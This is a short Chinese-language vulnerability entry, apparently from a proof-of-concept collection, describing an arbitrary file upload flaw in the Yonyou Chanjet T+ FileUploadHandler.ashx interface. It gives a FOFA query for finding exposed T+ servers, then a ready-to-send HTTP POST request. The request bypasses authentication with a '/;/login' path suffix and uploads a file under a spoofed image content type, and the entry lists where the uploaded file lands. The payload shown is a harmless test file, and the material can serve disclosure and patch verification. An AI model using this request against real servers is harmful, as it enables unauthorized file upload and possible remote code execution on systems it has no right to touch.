# 用友畅捷通-TPlus系统接口FileUploadHandler.ashx存在任意文件上传漏洞

用友畅捷通-TPlus系统接口FileUploadHandler.ashx存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
app="畅捷通-TPlus"
```

## poc

```pseudocode
POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 180
Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6

--f95ec6be8c3acff8e3edd3d910d3b9a6
Content-Disposition: form-data; name="file"; filename="test123.txt"
Content-Type: image/jpeg

test123
--f95ec6be8c3acff8e3edd3d910d3b9a6--
```

文件路径`/tplus/UserFiles/test123.txt`

